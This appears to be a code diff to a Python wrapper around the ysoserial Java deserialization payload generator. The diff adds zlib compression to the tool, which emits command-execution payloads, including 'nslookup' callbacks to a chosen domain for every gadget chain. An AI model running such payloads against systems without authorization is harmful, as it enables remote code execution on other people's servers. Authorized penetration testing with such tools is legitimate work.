@@ -6,6 +6,7 @@ import os
 import shutil
 import subprocess
 import sys
+import zlib
 
 JAR_PATH = "/app/ysoserial-all.jar"
 
@@ -29,16 +30,18 @@ def check_dependencies():
         print(f"Error: JAR not found: {JAR_PATH}", file=sys.stderr)
         sys.exit(1)
 
-def run_ysoserial(payload_type, command, compress=False, raw=False):
+def run_ysoserial(payload_type, command, compression=None, raw=False):
     """Executes the JAR file and returns the payload (raw bytes or base64 encoded string)."""
     try:
         cmd = ["java", "-jar", JAR_PATH, payload_type, command]
         result = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, check=True)
         data = result.stdout
 
-        # 1. Apply gzip compression if -c is specified
-        if compress:
+        # 1. Apply compression if specified
+        if compression == "gzip":
             data = gzip.compress(data)
+        elif compression == "zlib":
+            data = zlib.compress(data)
 
         # 2. Return raw bytes or base64-encoded string
         if raw:
@@ -57,7 +60,8 @@ def main():
         epilog=(
             "Examples:\n"
             "  %(prog)s CommonsCollections1 \"whoami\"\n"
-            "  %(prog)s -c CommonsCollections1 \"whoami\"\n"
+            "  %(prog)s -c CommonsCollections1 \"whoami\"          # defaults to gzip\n"
+            "  %(prog)s -c zlib CommonsCollections1 \"whoami\"     # uses zlib compression\n"
             "  %(prog)s -r CommonsCollections1 \"whoami\"\n"
             "  %(prog)s -c -r CommonsCollections1 \"whoami\"\n"
             "  %(prog)s -d example.com"
@@ -72,8 +76,10 @@ def main():
     parser.add_argument(
         "-c",
         "--compress",
-        action="store_true",
-        help="Gzip compress the payload data before base64 encoding",
+        nargs="?",
+        const="gzip",
+        choices=["gzip", "zlib"],
+        help="Compress the payload data using gzip or zlib (defaults to gzip if flag is used without an argument)",
     )
     parser.add_argument(
         "-r",
@@ -93,7 +99,7 @@ def main():
 
         for payload in PAYLOADS:
             test_input = f"nslookup {payload}.{args.domain}"
-            output = run_ysoserial(payload, test_input, compress=args.compress, raw=args.raw)
+            output = run_ysoserial(payload, test_input, compression=args.compress, raw=args.raw)
             if output is not None:
                 if args.raw:
                     sys.stdout.buffer.write(output)
@@ -104,7 +110,7 @@ def main():
     # 2. Single payload generation mode (e.g. script.py Payload "command")
     if len(remaining) == 2:
         payload_type, command = remaining
-        output = run_ysoserial(payload_type, command, compress=args.compress, raw=args.raw)
+        output = run_ysoserial(payload_type, command, compression=args.compress, raw=args.raw)
         if output is not None:
             if args.raw:
                 sys.stdout.buffer.write(output)
